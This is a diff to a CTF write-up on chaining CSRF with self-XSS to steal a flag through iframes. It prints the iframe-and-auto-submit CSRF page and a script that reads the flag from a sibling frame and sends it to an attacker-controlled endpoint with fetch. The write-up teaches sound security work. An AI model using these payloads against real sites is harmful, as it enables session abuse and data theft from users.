@@ -22,10 +22,10 @@ Then a friend kindly helped me and made me realise that what I was doing made no
 ### CSRF+XSS done right
 After the pointers given to me we created a payload with two iframes.  
 One iframe contained the */flag* endpoint, the other would log in **my** account and visit the */me* endpoint triggering my **Javascript payload**.  
-The payload would then take the flag from the other iframe (using [iframe-to-inframe](https://www.dyn-web.com/tutorials/iframes/refs/) interaction) given that */me* and */flag* share the same **origin**.  
+The payload would then take the flag from the other iframe (using [iframe-to-iframe](https://www.dyn-web.com/tutorials/iframes/refs/) interaction) given that */me* and */flag* share the same **origin**.  
 Between this actions there has to be some waiting period for the resources to load, or bad things could happen because of shared cookie jars.
 <br>
-The CSRF code we uploaded is the following  
+The CSRF code we uploaded on [Beeceptor](https://beeceptor.com/) is the following:  
 ```
 <iframe id="flag_frame" src="https://typeselfsub.web.ctfcompetition.com/flag"></iframe>
 
@@ -37,11 +37,11 @@ The CSRF code we uploaded is the following
 
         <script>
             setTimeout(function(){
-            	<!-- Log in my account -->
+            	//Log in my account
                 evil.submit();
         
                 setTimeout(function(){
-                    <!-- Visit my page containing the XSS payload -->
+                    //Visit my page containing the XSS payload
                     me_frame.src = 'https://typeselfsub.web.ctfcompetition.com/me';
                 }, 3000);
             }, 3000);
@@ -50,14 +50,15 @@ The CSRF code we uploaded is the following
         <iframe name="me_frame" id="me_frame"></iframe>
 ```
 While the XSS payload used in the */me* page is simply taking the flag from the document and sending it to an endpoint we control  
-```<script>
+```
+    <script>
         let flagd = parent.frames[0].window.document.getElementById('flag').innerText;
         fetch('https://myendpoint.com?flag='.concat(flagd));
     </script>
 ```
 Notice how `frames[0]` is used, that's because accessing the parent document in other ways would break **SOP** rules, since the origin in the iframe and the one in the page are different!  
 <br>
-The last thing needed was to embed an iframe (*another one*) as a *reason* in the request for chat containing the page with our **CSRF payload** thus starting the chain of payloads!  
+The last thing needed was to embed an iframe (*another one*) as a *reason* in the request for chat containing the page with our **CSRF payload** (on *Beeceptor*) thus starting the chain of payloads!  
 And there it was, the flag!  
 `CTF{self-xss?-that-isn't-a-problem-right...}`
 <img src="flag.png" alt="Flag!"/>
